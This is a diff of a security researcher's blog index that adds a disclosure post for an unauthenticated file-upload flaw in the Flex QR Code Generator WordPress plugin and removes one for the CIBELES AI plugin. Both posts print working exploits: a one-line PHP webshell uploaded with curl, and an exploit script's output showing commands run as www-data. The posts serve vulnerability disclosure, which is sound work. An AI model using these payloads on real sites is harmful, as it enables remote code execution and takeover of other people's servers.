@@ -72,7 +72,7 @@
 <meta property="og:url" content="https://ryankozak.com/" />
 
 
-<meta property="og:updated_time" content="2025-12-04T00:02:00Z" />
+<meta property="og:updated_time" content="2025-12-05T00:01:00Z" />
 
 
 <link rel="sitemap" type="application/xml" title="Sitemap" href='https://ryankozak.com/sitemap.xml' />
@@ -275,6 +275,8 @@
                 
                         
                 
+                        
+                
             
         
         
@@ -295,6 +297,10 @@
                         </li>
                         
                             <li class="bullet">
+                                <a href="https://ryankozak.com/posts/cve-2025-12673/">Flex QR Code Generator &lt;= 1.2.6 - Unauthenticated Arbitrary File Upload</a>
+                            </li>
+                        
+                            <li class="bullet">
                                 <a href="https://ryankozak.com/posts/cve-2025-12189/">Bread &amp; Butter: Gate content &#43; Capture leads &#43; Collect first-party data &#43; Nurture with Ai agents &lt;= 7.10.1321 - Cross-Site Request Forgery to Arbitrary File Upload</a>
                             </li>
                         
@@ -310,10 +316,6 @@
                                 <a href="https://ryankozak.com/posts/cve-2025-13597/">AI Feeds &lt;= 1.0.11 - Unauthenticated Arbitrary File Upload</a>
                             </li>
                         
-                            <li class="bullet">
-                                <a href="https://ryankozak.com/posts/cve-2025-13595/">CIBELES AI &lt;= 1.10.8 - Unauthenticated Arbitrary File Upload</a>
-                            </li>
-                        
                     
                 
             
@@ -322,6 +324,8 @@
                 
             
                 
+                
+                        
                 
                         
                 
@@ -423,6 +427,75 @@
                 <div class="posts">
     
     
+    <article class="post">
+        <div class="info">
+  <h1 class="post-title">
+    <a href="https://ryankozak.com/posts/cve-2025-12673/">Flex QR Code Generator &lt;= 1.2.6 - Unauthenticated Arbitrary File Upload</a>
+  </h1>
+
+  <div class="headline">
+    <div>
+      
+      
+      <time datetime=" 2025-12-05T00:01:00Z" class="post-date">
+        December 5, 2025
+      </time>
+      
+      <span> - </span>
+      <span class="reading-time">
+        
+          
+        
+
+        <span>2 mins read</span>
+      </span>
+    </div>
+
+    
+    <ul class="tags">
+      
+      <li class="tag-CVE">
+        <a href="https://ryankozak.com/tags/cve">CVE</a>
+      </li>
+      
+      <li class="tag-WordPress">
+        <a href="https://ryankozak.com/tags/wordpress">WordPress</a>
+      </li>
+      
+      <li class="tag-Flex QR Code Generator">
+        <a href="https://ryankozak.com/tags/flex-qr-code-generator">Flex QR Code Generator</a>
+      </li>
+      
+    </ul>
+    
+  </div>
+
+  
+  
+
+  
+</div>
+
+        
+        <h3 id="cve-2025-12673">CVE-2025-12673</h3>
+<p>The <a href="https://wordpress.org/plugins/flex-qr-code-generator/" target="_blank">Flex QR Code Generator</a> plugin does not validate user permission or sanitize file uploads in its <code>update_qr_code</code> AJAX endpoint, allowing unauthenticated attackers to upload arbitrary files including executable PHP scripts, leading to remote code execution.</p>
+<h2 id="tldr-exploits">TL;DR Exploits</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Upload PHP webshell</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;&lt;?php system($_GET[&#34;cmd&#34;]); ?&gt;&#39;</span> &gt; shell.php
+</span></span><span style="display:flex;"><span>curl -X POST <span style="color:#e6db74">&#34;https://victimsite.com/wp-admin/admin-ajax.php&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -F <span style="color:#e6db74">&#34;action=flexqr_update_qr&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -F <span style="color:#e6db74">&#34;qrId=1&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -F <span style="color:#e6db74">&#34;qrData={\&#34;data\&#34;:\&#34;https://example.com\&#34;}&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -F <span style="color:#e6db74">&#34;logo=@shell.php&#34;</span>
+</span></span></code></pre></div><h2 id="details">Details</h2>
+<p>The vulnerability exists in the <code>update_qr_code</code> method of the <code>FlexQrCodeGenerator</code> class. The plugin registers AJAX endpoints for unauthenticated users, allowing any visitor to upload arbitrary files that get stored in the WordPress uploads directory.</p>
+        
+        <div class="read-more-link">
+            <a href="/posts/cve-2025-12673/">Read More…</a>
+        </div>
+        
+        
+    </article>
     <article class="post">
         <div class="info">
   <h1 class="post-title">
@@ -595,7 +668,6 @@
 
         
         <h3 id="cve-2025-12585">CVE-2025-12585</h3>
-<h2 id="summary">Summary</h2>
 <p>The <a href="https://wordpress.org/plugins/mxchat-basic/" target="_blank">MxChat Basic</a> plugin does not verify session ownership in the <code>mxchat_fetch_conversation_history</code> AJAX endpoint, allowing unauthenticated users to access other users&rsquo; conversation history and IP addresses through Insecure Direct Object Reference (IDOR) vulnerabilities.</p>
 <h2 id="tldr-exploits">TL;DR Exploits</h2>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>TARGET_SITE<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://example.com&#34;</span>
@@ -691,86 +763,6 @@ www-data
         
         <div class="read-more-link">
             <a href="/posts/cve-2025-13597/">Read More…</a>
-        </div>
-        
-        
-    </article>
-    <article class="post">
-        <div class="info">
-  <h1 class="post-title">
-    <a href="https://ryankozak.com/posts/cve-2025-13595/">CIBELES AI &lt;= 1.10.8 - Unauthenticated Arbitrary File Upload</a>
-  </h1>
-
-  <div class="headline">
-    <div>
-      
-      
-      <time datetime=" 2025-11-25T00:00:00Z" class="post-date">
-        November 25, 2025
-      </time>
-      
-      <span> - </span>
-      <span class="reading-time">
-        
-          
-        
-
-        <span>3 mins read</span>
-      </span>
-    </div>
-
-    
-    <ul class="tags">
-      
-      <li class="tag-CVE">
-        <a href="https://ryankozak.com/tags/cve">CVE</a>
-      </li>
-      
-      <li class="tag-WordPress">
-        <a href="https://ryankozak.com/tags/wordpress">WordPress</a>
-      </li>
-      
-      <li class="tag-CIBELES AI">
-        <a href="https://ryankozak.com/tags/cibeles-ai">CIBELES AI</a>
-      </li>
-      
-    </ul>
-    
-  </div>
-
-  
-  
-
-  
-</div>
-
-        
-        <h3 id="cve-2025-13595">CVE-2025-13595</h3>
-<h2 id="summary">Summary</h2>
-<p>The <a href="https://wordpress.org/plugins/cibeles-ai/" target="_blank">Cibeles AI</a> WordPress plugin versions 1.10.8 and below contain an unauthenticated remote code execution vulnerability in the <code>actualizador_git.php</code> file. This file is directly accessible via HTTP without any authentication or authorization checks, allowing unauthenticated attackers to download arbitrary GitHub repositories and overwrite plugin files, leading to remote code execution.</p>
-<h2 id="tldr-exploits">TL;DR Exploits</h2>
-<p>A <a href="https://github.com/d0n601/CVE-2025-13595/blob/master/CVE-2025-13595.py" target="_blank">CVE-2025-13595.py</a> is provided to demonstrate a remote attacker uploading <code>shell.php</code> and executing remote code:</p>
-<pre tabindex="0"><code>python3 CVE-2025-13595.py -t http://techcorp.cc -o d0n601 -r minimal-rce -k github_pat_YOURKEY -c whoami
-[*] Exploiting actualizador_git.php vulnerability...
-[*] Downloading and installing shell from GitHub repository: d0n601/minimal-rce
-Descargando d0n601/minimal-rce@main ...
-Eliminando entradas extra...
-Copiando archivos...
-OK. Mirror aplicado en: /var/www/html/wp-content/plugins/cibeles-ai
-
-[*] Exploit executed. Checking if shell.php was created...
-
-[*] Testing shell access...
-www-data
-
-
-[*] Shell should be accessible at:
-    http://techcorp.cc/wp-content/plugins/cibeles-ai/shell.php?cmd=COMMAND
-</code></pre><h2 id="technical-analysis">Technical Analysis</h2>
-<p>The vulnerability exists in <code>/wp-content/plugins/cibeles-ai/actualizador_git.php</code>. This file implements a GitHub repository mirroring system that can be accessed directly via HTTP without any security controls.</p>
-        
-        <div class="read-more-link">
-            <a href="/posts/cve-2025-13595/">Read More…</a>
         </div>
         
         
